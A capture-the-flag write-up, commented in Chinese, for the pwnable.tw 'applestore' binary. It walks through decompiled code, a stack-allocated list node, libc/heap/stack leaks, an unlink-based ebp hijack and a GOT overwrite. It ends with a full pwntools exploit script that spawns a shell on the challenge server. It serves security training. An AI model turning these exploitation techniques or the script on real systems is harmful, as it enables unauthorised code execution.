# pwnable.tw-applestore

## checksec

```shell
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## IDA

**handler**

```c
unsigned int handler()
{
  char nptr[22]; // [esp+16h] [ebp-22h] BYREF
  unsigned int v2; // [esp+2Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  while ( 1 )
  {
    printf("> ");
    fflush(stdout);
    my_read(nptr, 0x15u);
    switch ( atoi(nptr) )
    {
      case 1:
        list();//列出商品菜单，useless
        break;
      case 2:
        add();//向链表中添加一个商品
        break;
      case 3:
        delete();//从链表中删除一个商品
        break;
      case 4:
        cart();//列出链表中所有的商品
        break;
      case 5:
        checkout();
        break;
      case 6:
        puts("Thank You for Your Purchase!");
        return __readgsdword(0x14u) ^ v2;
      default:
        puts("It's not a choice! Idiot.");
        break;
    }
  }
}
```

**add**

```c
unsigned int add()
{
  const char **v1; // [esp+1Ch] [ebp-2Ch]
  char nptr[22]; // [esp+26h] [ebp-22h] BYREF
  unsigned int v3; // [esp+3Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Device Number> ");
  fflush(stdout);
  my_read(nptr, 0x15u);
  switch ( atoi(nptr) )
  {
    case 1:
      v1 = (const char **)create("iPhone 6", 199);
      insert(v1);
      goto LABEL_8;
    case 2:
      v1 = (const char **)create("iPhone 6 Plus", 299);
      insert(v1);
      goto LABEL_8;
    case 3:
      v1 = (const char **)create("iPad Air 2", 499);
      insert(v1);
      goto LABEL_8;
    case 4:
      v1 = (const char **)create("iPad Mini 3", 399);
      insert(v1);
      goto LABEL_8;
    case 5:
      v1 = (const char **)create("iPod Touch", 199);
      insert(v1);
LABEL_8:
      printf("You've put *%s* in your shopping cart.\n", *v1);
      puts("Brilliant! That's an amazing idea.");
      break;
    default:
      puts("Stop doing that. Idiot!");
      break;
  }
  return __readgsdword(0x14u) ^ v3;
}
```

**create**

```c
char **__cdecl create(const char *a1, char *a2)
{
  char **v3; // [esp+1Ch] [ebp-Ch]

  v3 = (char **)malloc(0x10u);
  v3[1] = a2;
  asprintf(v3, "%s", a1);
  v3[2] = 0;
  v3[3] = 0;
  return v3;
}
```

申请了0x10大小的空间，使用`asprintf`申请商品名称所占用大小的内存空间，并返回指针。`asprintf`所申请的内存空间需要手动释放。在32位程序下，一个指针占4字节，紧接着的四个字节放入了商品的价格，`int`类型也是四个字节，其余的0x8字节都置位0。

**insert**

```c
int __cdecl insert(int a1)
{
  int result; // eax
  _DWORD *i; // [esp+Ch] [ebp-4h]

  for ( i = &myCart; i[2]; i = (_DWORD *)i[2] )
    ;
  i[2] = a1;
  result = a1;
  *(_DWORD *)(a1 + 12) = i;
  return result;
}
```

0x10的空间在`create`的时候只使用了0x8，在`insert`中，首先是一个循环，这个循环是用来遍历链表的。在初始时，`myCart`为空，直接跳出了循环，之后在其+8的位置放入了将插入的商品的地址，又在商品内存的+12的位置插入了`myCart`的地址。

到这里就很清晰了，程序使用了一个双向链表来管理商品，其内存布局如下：

```c
|chunk head	|
|name_addr	|	+0
|price		|	+4
|fd			|	+8
|bk			|	+12
```

**delete**

```c
unsigned int delete()
{
  int v1; // [esp+10h] [ebp-38h]
  int v2; // [esp+14h] [ebp-34h]
  int v3; // [esp+18h] [ebp-30h]
  int v4; // [esp+1Ch] [ebp-2Ch]
  int v5; // [esp+20h] [ebp-28h]
  char nptr[22]; // [esp+26h] [ebp-22h] BYREF
  unsigned int v7; // [esp+3Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  v1 = 1;
  v2 = dword_804B070;
  printf("Item Number> ");
  fflush(stdout);
  my_read(nptr, 0x15u);
  v3 = atoi(nptr);
  while ( v2 )
  {
    if ( v1 == v3 )
    {
      v4 = *(_DWORD *)(v2 + 8);
      v5 = *(_DWORD *)(v2 + 12);
      if ( v5 )
        *(_DWORD *)(v5 + 8) = v4;
      if ( v4 )
        *(_DWORD *)(v4 + 12) = v5;
      printf("Remove %d:%s from your shopping cart.\n", v1, *(const char **)v2);
      return __readgsdword(0x14u) ^ v7;
    }
    ++v1;
    v2 = *(_DWORD *)(v2 + 8);
  }
  return __readgsdword(0x14u) ^ v7;
}
```

删除函数，根据商品的序号将商品从链表中删除，指针的更新也很简单：

```c
fd->bk = p->bk;
bk->fd = p->fd;
```

**checkout**

```c
unsigned int checkout()
{
  int v1; // [esp+10h] [ebp-28h]
  char *v2[5]; // [esp+18h] [ebp-20h] BYREF
  unsigned int v3; // [esp+2Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  v1 = cart();
  if ( v1 == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf(v2, "%s", "iPhone 8");
    v2[1] = (char *)1;		//v2 is in the stack !!!
    insert((int)v2);
    v1 = 7175;
  }
  printf("Total: $%d\n", v1);
  puts("Want to checkout? Maybe next time!");
  return __readgsdword(0x14u) ^ v3;
}
```

当商品的总价格为7174时，就会将`iPhone 8`加入链表。

这里注意`iPhone 8`的内存空间是在栈上的！`v2`变量在`ebp-0x20`的位置，这点很重要。

我们知道，在调用函数时，调用者会将被调函数的参数压栈，之后保存栈底的位置，即`ebp`。在被调函数返回时，并没有对栈进行清空，只是恢复了栈的位置。而其他被调函数还有可能会使用栈上的这个数据。那么如果我们通过一些手段修改了这个数据，就可能造成攻击，看`headler`的函数调用。

```assembly
.text:08048C33 loc_8048C33:                            ; CODE XREF: handler+5E↑j
.text:08048C33                                         ; DATA XREF: .rodata:jpt_8048C31↓o
.text:08048C33                 call    list            ; jumptable 08048C31 case 1
.text:08048C38                 jmp     short loc_8048C63
.text:08048C3A ; ---------------------------------------------------------------------------
.text:08048C3A
.text:08048C3A loc_8048C3A:                            ; CODE XREF: handler+5E↑j
.text:08048C3A                                         ; DATA XREF: .rodata:jpt_8048C31↓o
.text:08048C3A                 call    add             ; jumptable 08048C31 case 2
.text:08048C3F                 jmp     short loc_8048C63
.text:08048C41 ; ---------------------------------------------------------------------------
.text:08048C41
.text:08048C41 loc_8048C41:                            ; CODE XREF: handler+5E↑j
.text:08048C41                                         ; DATA XREF: .rodata:jpt_8048C31↓o
.text:08048C41                 call    delete          ; jumptable 08048C31 case 3
.text:08048C46                 jmp     short loc_8048C63
.text:08048C48 ; ---------------------------------------------------------------------------
.text:08048C48
.text:08048C48 loc_8048C48:                            ; CODE XREF: handler+5E↑j
.text:08048C48                                         ; DATA XREF: .rodata:jpt_8048C31↓o
.text:08048C48                 call    cart            ; jumptable 08048C31 case 4
.text:08048C4D                 jmp     short loc_8048C63
.text:08048C4F ; ---------------------------------------------------------------------------
.text:08048C4F
.text:08048C4F loc_8048C4F:                            ; CODE XREF: handler+5E↑j
.text:08048C4F                                         ; DATA XREF: .rodata:jpt_8048C31↓o
.text:08048C4F                 call    checkout        ; jumptable 08048C31 case 5
.text:08048C54                 jmp     short loc_8048C63
```

这里只是一个一个的`call`操作，没有对栈进行其他的处理，所以栈上的`v2`相对于这些函数的`ebp`而言偏移是相同的。

那么我们如何覆写这块内存呢？

请看在这些函数读取操作的时候：

**cart**

```c
int cart()
{
  int v0; // eax
  int v2; // [esp+18h] [ebp-30h]
  int v3; // [esp+1Ch] [ebp-2Ch]
  int i; // [esp+20h] [ebp-28h]
  char buf[22]; // [esp+26h] [ebp-22h] BYREF
  unsigned int v6; // [esp+3Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  v2 = 1;
  v3 = 0;
  printf("Let me check your cart. ok? (y/n) > ");
  fflush(stdout);
  my_read(buf, 0x15u);
  if ( buf[0] == 121 )
  {
    puts("==== Cart ====");
    for ( i = dword_804B070; i; i = *(_DWORD *)(i + 8) )
    {
      v0 = v2++;
      printf("%d: %s - $%d\n", v0, *(const char **)i, *(_DWORD *)(i + 4));
      v3 += *(_DWORD *)(i + 4);
    }
  }
  return v3;
}
```

这里`buf`距离`ebp`0x22字节，`iPhone 8`字符串在`ebp-20`的位置，而`buf`允许写入0x15字节，到这里你应该就想到如何覆写了。我们在前两个字节写入选项，在后面覆写构造`iPhone 8`的内存结构。

首先，我们将字符串地址覆写为某got表地址，那么调用`cart`就可以leak libc。在遍历链表的时候只根据`fd`指针，所以我们将fd覆写为`myCart+8`的地址就可以再次泄露heap地址，而heap上其实是保存着栈的地址的。也可以通过使用libc中的environ进行泄露。

接着，我们可以通过`delete`来实现任意地址写。这里有一个问题，got表地址被写入后，会被当作商品的指针，而实际上got表指向的是代码段，这个段是不可写的！所以，我们无法通过简单的填写指针来进行got表劫持。

这里，我们通过劫持`delete`的ebp，在函数中，局部变量的寻址一般是通过`ebp-offset`实现的，所以，我们通过劫持`ebp`到got表，在输入变量的时候就可以对got表进行覆写。

接着我们要做的就是覆写劫持`delete`的ebp，写入`atoi_got+0x22`。因为允许我们输入的变量相对于`ebp`的偏移为0x22。参考上面`delete`的等价操作，只要简单的覆写`fd`和`bk`即可。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
import sys

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"
context.terminal = ['tmux', 'splitw', '-h']

binary='./applestore'
#gdb.attach(sh)
if 'g' in sys.argv[1]:
	context.log_level="DEBUG"
if 'l' in sys.argv[1] and 'r' not in sys.argv[1]:
	log.info('Test in local...')
	sh=process(binary)
if 'r' in sys.argv[1]:
	log.info('Attacking...')
	sh=remote('chall.pwnable.tw',10104)

elf = ELF(binary,checksec=False)
#libc = ELF('',checksec=False)
puts_got = elf.got['puts']
atoi_got = elf.got['atoi']
mycart = 0x804B068
add = '2';delete='3';cart='4';checkout='5'

def do(choice,payload):
	sh.sendlineafter('> ',choice)
	sh.sendlineafter('>',payload)

for i in range(6):
	do(add,b'1')
for i in range(20):
	do(add,b'2')

do(checkout,b'y') #add iphone-8

payload= b'y\x00'+p32(puts_got)+p32(0x1)+p32(mycart+8)+p32(1)
do(cart,payload)
sh.recvuntil('27: ')
puts_addr=u32(sh.recv(4))
sh.recvuntil('28: ')
heap_addr = u32(sh.recv(4))
leak('puts addr',puts_addr)
leak('heap addr',heap_addr)
libc = LibcSearcher('puts',puts_addr)
libcbase = puts_addr - libc.dump('puts')
leak('libc base',libcbase)
system = libcbase+libc.dump('system')

env = libcbase+libc.dump('environ')
payload= b'y\x00'+p32(env)+p32(0x1)+p32(mycart+8)+p32(1)
do(cart,payload)
sh.recvuntil('27: ')
stack =u32(sh.recv(4))
leak('stack',stack)

payload = b'27'+p32(env)+p32(0x1)+p32(atoi_got+0x22)+p32(stack - 0x100 - 0xc)

do(delete,payload)

sh.sendlineafter('> ',p32(system)+b';/bin/sh')

sh.interactive()
```

